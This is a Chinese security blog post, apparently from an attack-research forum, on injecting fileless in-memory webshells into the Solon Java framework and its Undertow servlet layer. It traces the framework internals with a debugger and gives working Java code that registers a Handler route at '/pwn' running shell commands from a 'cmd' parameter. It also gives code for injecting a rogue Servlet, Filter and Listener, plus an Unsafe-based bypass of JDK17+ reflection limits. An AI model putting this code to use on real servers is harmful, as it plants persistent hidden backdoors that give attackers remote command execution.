Solon框架注入内存马(二)
===============

接上一篇文章思考部分，该框架应该还可以注入其他内存马，下面通过对[solon-examples](https://github.com/opensolon/solon-examples)这个项目调试分析

Handler内存马
----------

命名可能不太准确，暂时这么叫吧，调试的是demo3011-web

在HelloworldController中，在此思考一个问题，路由“/helloworld”是如何绑定HelloworldController类的helloworld()方法的，断点调试一下

![image-20240815112051896](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-420e2ea474f92deaf9eecee563210cb49926f317.png)

逐个查看和分析当前调用栈，来到org.noear.solon.core.route.RouterHandler这个类的handle方法

![image-20240815113545106](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-858e0740e1e7ae591894bb71ca81e6afff17ea72.png)

其中this.router大有来头，里面存储着当前所有的路径信息，包括对应作用的类和方法，请求路径和请求方式

![image-20240815113639541](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-7ba88f3e988d1bef3fb60ea2d4f9453f05368072.png)

找到“/helloworld”，可以看到ActionDefault对象里存储着对应类`HelloworldController`

![image-20240815114056863](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-480441e8c4e77b1fe1e9b1e2f6b2fc24cd61d67e.png)

如果能够动态的在routesH添加一条RouterDefault，估计就能够实现内存马了

如何添加？

在org.noear.solon.core.route.RouterDefault这个类中，存在add方法，可以往routesH\[1\]添加RoutingDefault

![image-20240815120042514](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-75f4613151570d75661a30e8e30b77dc7fa5efdb.png)

add方法有几个，找个简单点的

![image-20240815120527027](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-8f5fbf24d1394ccca0d1c22682f3ebf840022c8a.png)

其中第一个参数expr是路径,MethodType method是请求方式，至于Handler handler，则是一个ActionDefault对象，ActionDefault实现了Handler

![image-20240815121136525](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-09a3dae6012615f9106fdefe6767a00dbb9d7f48.png)

![image-20240815121236098](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-9989c5f54c31a4f58dd92d512c5e60a5d429f2e3.png)

这里new一个ActionDefault对象就行了，查看构造方法

![image-20240815121839833](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-1f43bd96a4582b84a7c2e55c7a8dcce08a5b021a.png)

使用最简单的，也需要两个参数，其中BeanWrap 对象需要 AppContext和Class两个参数

![image-20240815122043864](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-878a995901eb1be7f0ee8e0807eb611982a846ef.png)

AppContext 是 Solon 框架的核心组件是应用上下文接口，可在上下文获取，Class clz则是路径下对应的类

回到ActionDefault这里的Method，则是Class clz下的方法，就是只访问路径时，会调用的方法，这个可通过反射获取

综上，内存马构造如下：

第一步，先搞个恶意类：

```java
public static class MemShell{  
        public MemShell(){  
​  
        }  
        public  void pwn(){  
            Context ctx \= Context.current();  
            try{  
                if(ctx.param("cmd")!=null){  
                    String str \= ctx.param("cmd");  
                    try{  
                        String\[\] cmds \=  
                                System.getProperty("os.name").toLowerCase().contains("win") ? new String\[\]{"cmd.exe",  
                                        "/c", str} : new String\[\]{"/bin/bash", "-c", str};  
                        String output \= (new java.util.Scanner((new  
                                ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\\\A").next();  
                        ctx.output(output);  
                    }catch (Exception e) {  
                        e.printStackTrace();  
                    }  
                }  
            }catch (Throwable e){  
                ctx.output(e.getMessage());  
            }  
        }  
    }
```

第二步，获取到存储大量路径内容的RouterDefault，即前面的this.router ，还有获取AppContext

反射获取对象：

```java
public Object getfieldobj(Object obj, String fieldname) throws NoSuchFieldException, IllegalAccessException {  
        try{  
            Field field \= obj.getClass().getDeclaredField(fieldname);  
            field.setAccessible(true);  
            Object fieldobj \= field.get(obj);  
            return fieldobj;  
        }catch (NoSuchFieldException e) {  
            Field field \= obj.getClass().getSuperclass().getDeclaredField(fieldname);  
            field.setAccessible(true);  
            Object fieldobj \= field.get(obj);  
            return fieldobj;  
        }  
    }
```

获取RouterDefault和AppContext ，这个可以使用java-object-searcher工具查找

```java
Context ctx \= Context.current();  
Object \_request \= getfieldobj(ctx,"\_request");  
Object request \= getfieldobj(\_request,"request");  
Object serverHandler \= getfieldobj(request,"serverHandler");  
Object handler \= getfieldobj(serverHandler,"handler");  
Object arg$1 \= getfieldobj(handler,"arg$1");  
​  
AppContext appContext \= (AppContext) getfieldobj(arg$1,"\_context");   
RouterDefault \_router \= (RouterDefault) getfieldobj(arg$1,"\_router");
```

第三步，注册

```java
BeanWrap beanWrap \= new BeanWrap(appContext,MemShell.class);  
Method method \= MemShell.class.getDeclaredMethod("pwn");  
Handler newhandler \= new ActionDefault(beanWrap,method);  
\_router.add("/pwn", MethodType.ALL,newhandler);
```

验证：动态注册后访问

![image-20240815123253817](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-6c71658f69c9ea6cf3afe468be1d17ad8f7e7001.png)

JBoss AS中间件
-----------

总会有些老的项目或者某些框架，必须使用 Servlet 的接口。。。Solon 对这种项目，也提供了良好的支持。

当需要 Servlet 接口时，需要使用插件：

- 或者 solon.boot.jetty
- 或者 solon.boot.undertow

这块内容，也有助于用户了解 Solon 与 Servlet 的接口关系。Solon 有自己的 Context + Handler 接口设计，通过它以适配 Servlet 和 Not Servlet 的 http server，以及 websocket, socket（以实现三源合一的目的）：

- 其中 solon.web.servlet ，专门用于适配 Servlet 接口。

调试发现,这里用的是`io.undertow.servlert`的api,即JBoss AS (JBoss Application Server),和常用的不太一样

### Servlet

使用demo3012-web\_servlet进行调试分析，查看这些中间件是如何被注册的，在HeheServlet下个断点，访问对应路径进行调试

![image-20240816175142048](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-fb52865f64c0e0bbec733894f8278fcb4438c750.png)

发现有很多个handleRequest，查看最初始的那个，来到了`io.undertow.servlet.handlers.ServletInitialHandler`

![image-20240816175453732](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-3594b9d5715a6a3be429244103a09489b8c65454.png)

这里的servletRequestContext应该是当前请求的上下文，查看`servletRequestContext.getOriginalServletPathMatch().getServletChain()`

![image-20240816175758744](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-72f9e17d222f452a78d5650748aae529d6cd4cc7.png)

可以看到当前请求所对应的Servlet的信息，保存在Servletinfo对象中,查看一下这个类，来到`io.undertow.servlet.api.ServletInfo`

![image-20240816180506212](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-5dbf25a91f89409c36bcb313e165400fb5f86e8a.png)

这个类的构造函数中就，会保存servlet的类和名。Servlet是应用启动时注册的，在这里下个断点，重启应用

![image-20240816182419294](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-1aa3e5bd36c3f2586eb0fc90f6dcdd8078636c0d.png)

成功断点，并来到了注册HeHeServlet的瞬间，调用栈往前查看，来到`io.undertow.servlet.spec.ServletContextImpl`的addServlet

![image-20240816183021386](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-8461bca63f07081e72dd363f6dbec599d69779c7.png)

这个直接就是Servlet被注册的过程了，可以根据这几个步骤进行动态注册

PS：这里不能直接用当前的`addServlet`,前面存在判断`this.ensureNotInitialized();`，如果已经初始化了，就不再能往下允许，尝试反射修改也改不了

大概步骤：

- 获取到deployment和deploymentInfo
- new ServletInfo()，配置好Servlet的各种信息
- deploymentInfo.addServlet(servletInfo)
- deployment.getServlets().addServlet(servletInfo);

首先我们需要两个对象，deployment和deploymentInfo，其实拿到deployment就能拿到deploymentInfo

![image-20240816192007550](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-591089be7bbb001f48b73170545f8aef9e687e87.png)

如何拿到deployment和deploymentInfo？，这需要分为两种情况，如果已经当前存在类似ServletRequest req, ServletResponse res的对象，可直接反射req获取

![image-20240816193345380](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-ac41b4f4a3be930b7cfd7d6f9e7e0f038c760969.png)

但是正常情况下，还是建议从ThreadLocal下获取

```java
TargetObject \= {java.lang.Thread}   
  \---> threadLocals \= {java.lang.ThreadLocal$ThreadLocalMap}   
   \---> table \= {class \[Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;}   
    \---> \[10\] \= {java.lang.ThreadLocal$ThreadLocalMap$Entry}   
     \---> value \= {io.undertow.servlet.handlers.ServletRequestContext}   
      \---> deployment \= {io.undertow.servlet.core.DeploymentImpl}   
       \---> deploymentInfo \= {io.undertow.servlet.api.DeploymentInfo}  
 ```                         
                        
```java
public Object getCurrentThreadObj(String classname) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {  
        try{  
            Thread currentThread \= Thread.currentThread();  
            Object threadLocals \= getfieldobj(currentThread,"threadLocals");  
            Object\[\] table \= (Object\[\]) getfieldobj(threadLocals,"table");  
            for(int i\=0; i<table.length;i++){  
                Object tmpobj \= table\[i\];  
                if(tmpobj\==null) continue;  
                Object obj \= getfieldobj(tmpobj,"value");  
                if(obj!=null && obj.getClass().getName().equals(classname)){  
                    return obj;  
                }  
            }  
        }catch (Exception e){  
            e.printStackTrace();  
            return null;  
        }  
        return null;  
    }
```

内存马注册代码如下：

```java
Object o \= getCurrentThreadObj("io.undertow.servlet.handlers.ServletRequestContext");  
Deployment deployment \= (Deployment) getfieldobj(o,"deployment");  
DeploymentInfo deploymentInfo \= deployment.getDeploymentInfo();  
​  
ServletInfo servletInfo \= new ServletInfo("ServletMemShell", MemServlet.class).addMapping("/S");  
deploymentInfo.addServlet(servletInfo);  
deployment.getServlets().addServlet(servletInfo);
```

其中getfieldobj

```java
public Object getfieldobj(Object obj, String fieldname) throws NoSuchFieldException, IllegalAccessException {  
        try{  
            Field field \= obj.getClass().getDeclaredField(fieldname);  
            field.setAccessible(true);  
            Object fieldobj \= field.get(obj);  
            return fieldobj;  
        }catch (NoSuchFieldException e) {  
            Field field \= obj.getClass().getSuperclass().getDeclaredField(fieldname);  
            field.setAccessible(true);  
            Object fieldobj \= field.get(obj);  
            return fieldobj;  
        }  
    }
```

MemServlet.class如下：

```java
public static class MemServlet extends HttpServlet {  
        @Override  
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {  
            res.setContentType("text/html;charset=utf-8");  
            res.getWriter().write("MemServlet\\n");  
            //......  
        }  
    }
```

验证

![image-20240816195656623](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-cf4fb580b7fc011a4b3f5a75108d4d342c7237a9.png)

### Filter

同样的套路，调试分析，来到第一个doFilter这里

![image-20240816201215047](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-7958b7cbe3867efeb917259acc398471b92956c2.png)

![image-20240816201500895](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-ab209c43f26032fb0e6f31fbfea8b7f7627c6ea9.png)

这里是通过遍历this.filters来获取filter的，

![image-20240816201619392](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-2f88afd1ab3a8bd256c693ec989d0c36d0cda007.png)

而这个this.filters的赋值在构造函数，在此断点，启动调试

![image-20240816201826061](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-396f2a7977404e9a1dd8a222e56828b77fde5599.png)

往前，发现这个filters也是和deploymentInfo有联系

![image-20240816202138843](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-0ed7e5045ac688d0e8f589c145298fd13aee50bc.png)

继续往前看，跟踪一下这个noExtension，在`io.undertow.servlet.handlers.ServletPathMatches::setupServletChains`中调用了`creatHandler`

![image-20240816222222862](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-a2d20ebd5ef69b262a004a58b988b52472f4236f.png)

往上查看发现`addToListMap(noExtension, filterMapping.getDispatcher(), filter);`![image-20240816222441602](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-5e2d28eff5f6e6ad3799ad991a3b185f0e01ef19.png)

根进查看，大概的意思是将filter添加到noExtension的list中

![image-20240816222550146](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-dd3333f5553579b9445e0f76dd0ebeb6e9d906d0.png)

而filter是来自deploymentInfo

![image-20240816222828725](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-3b6361e327c1f941ce62b0894d7e06e4b4199ddd.png)

继续往上看的话，`deploymentInfo`是通过`this.deployment.getDeploymentInfo()`获取的

![image-20240816223058335](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-bdae5ca5d09da9f6f5bcfa1961b0c4e6a63c7e08.png)

this.deployment是通过构造函数赋值的，又在此下断点，重启调试，往上跟踪

![image-20240816224126681](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-8dc1af5445993556dee8e83c2717218573ecf501.png)

再往上来到了DeploymentManagerImpl的deploy,找到了deployment的源头

![image-20240816224223709](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-649e84e013aecedba76caf82cd5577bf4151f255.png)

这个方法往下运行会调用一个createServletsAndFilters方法跟进查看

![image-20240816224338211](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-d63a63a8f389a32308be16db3ec51f7ca3a718fc.png)

发现这个和添加Servlets类似

![](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-16647c88795840a2138413cd06bf75a5f335344f.png)

大概就是

```java
FilterInfo filterInfo\=new FilterInfo("name", filter.class);  
deploymentInfo.addFilter(filterInfo);  
deployment.getFilters().addFilter(filterInfo);
```

如何添加路由，没有指定路由无法触发filter

经过查找发现，这个Filter路由匹配是由deploymentInfo管理的

![image-20240816225832325](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-e886933be0b97515adf79ed3a797431b9b242704.png)

只需要`deploymentInfo.insertFilterUrlMapping(0,"FilterMemShell","/hello/*",DispatcherType.REQUEST);`即可

![image-20240816230132177](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-df93aef3089e4bb44db180a4b9cb1a6540a9c481.png)

综上：

```java
FilterInfo filterInfo\=new FilterInfo("FilterMemShell", MemFilter.class);  
deploymentInfo.addFilter(filterInfo);  
deploymentInfo.insertFilterUrlMapping(0,"FilterMemShell","/hello/\*",DispatcherType.REQUEST);  
deployment.getFilters().addFilter(filterInfo);
```

验证：

![image-20240816230503758](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-5a3e5cea3b6b11cde28b6e0f006d81c0b70d8fa6.png)

### Listenter

同样套路调试

![image-20240816231336143](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-c8871f660afd8a38d99e1596c0ce36431c640277.png)

往前，在ApplicationListeners中的requestInitialized调用

![image-20240816231411242](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-a6f02ac0c81f089aed7d3b001c5c3400f6c0ad1b.png)

this.servletRequestListeners存储着所有的Listener，通过当前类ApplicationListeners的addListener添加

![image-20240816231848480](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-3cf455043a59112a4e2d73ec96916512cc7b6785.png)

其构造方法，就已经在添加了

![image-20240816231957788](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-ba8b5c09cb7adc289bd10c8fb2cf2c534f64d2df.png)

重启调试一下发现createListeners 里面添加，还是this.deployment

![image-20240816232104907](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-3ffa3e6dd282e2f84163c5bc53c11b5ecd37cca8.png)

到这里思路就很清晰了，首先要deploymentInfo.addListener（listenerInfo），让后再调用ApplicationListeners的addListener里面即可

如何获取ApplicationListeners？

这个简单，deployment.getApplicationListeners()即可

综上：

```java
ListenerInfo listenerInfo \= new ListenerInfo(MemListener.class);  
deploymentInfo.addListener(listenerInfo);  
ManagedListener managedListener \= new ManagedListener(listenerInfo,false);  
deployment.getApplicationListeners().addListener(managedListener);
```

其中MemListener.class要回显，则需要获取HttpServletResponseImpl

```java
TargetObject = {java.lang.Thread}   
  ---> threadLocals = {java.lang.ThreadLocal$ThreadLocalMap}   
   ---> table = {class \[Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;}   
    ---> \[10\] = {java.lang.ThreadLocal$ThreadLocalMap$Entry}   
     ---> value = {io.undertow.servlet.handlers.ServletRequestContext}   
      ---> originalResponse = {io.undertow.servlet.spec.HttpServletResponseImpl}
```

回显编写

```java
public class TmpListener implements ServletRequestListener {  
    @Override  
    public void requestInitialized(ServletRequestEvent sre) {  
​  
        System.out.println("AAA\\n");  
        try {  
            bypassreflect(TmpListener.class); //绕过JDK17+反射限制  
            Object o \= getCurrentThreadObj("io.undertow.servlet.handlers.ServletRequestContext");  
            HttpServletResponseImpl response \= (HttpServletResponseImpl) getfieldobj(o,"originalResponse");  
            response.getWriter().write("MemListener!!!");  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
    public void bypassreflect(Class currentClass) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {  
        Class unsafeClass \= Class.forName("sun.misc.Unsafe");  
        Field field \= unsafeClass.getDeclaredField("theUnsafe");  
        field.setAccessible(true);  
        Unsafe unsafe \= (Unsafe) field.get(null);  
        Module baseModule \= Object.class.getModule();  
        long addr \= unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));  
        unsafe.getAndSetObject(currentClass, addr, baseModule);  
    }  
    public Object getfieldobj(Object obj, String fieldname) throws NoSuchFieldException, IllegalAccessException {  
        try{  
            Field field \= obj.getClass().getDeclaredField(fieldname);  
            field.setAccessible(true);  
            Object fieldobj \= field.get(obj);  
            return fieldobj;  
        }catch (NoSuchFieldException e) {  
            Field field \= obj.getClass().getSuperclass().getDeclaredField(fieldname);  
            field.setAccessible(true);  
            Object fieldobj \= field.get(obj);  
            return fieldobj;  
        }  
    }  
    public Object getCurrentThreadObj(String classname) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {  
        try{  
            Thread currentThread \= Thread.currentThread();  
            Object threadLocals \= getfieldobj(currentThread,"threadLocals");  
            Object\[\] table \= (Object\[\]) getfieldobj(threadLocals,"table");  
            for(int i\=0; i<table.length;i++){  
                Object tmpobj \= table\[i\];  
                if(tmpobj\==null) continue;  
                Object obj \= getfieldobj(tmpobj,"value");  
                if(obj!=null && obj.getClass().getName().equals(classname)){  
                    return obj;  
                }  
            }  
        }catch (Exception e){  
            e.printStackTrace();  
            return null;  
        }  
        return null;  
    }  
}
```

验证：

![image-20240816235015268](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-421ab8dfe26662849264e4e7d756cf276661abda.png)

参考
--

[https://xz.aliyun.com/t/12161?time\_\_1311=GqGxRDuDgQD%3DG%3DD%2FYriQGkbHKE%2BzkF4D](https://xz.aliyun.com/t/12161?time__1311=GqGxRDuDgQD%3DG%3DD%2FYriQGkbHKE%2BzkF4D)

<https://solon.noear.org/article/429>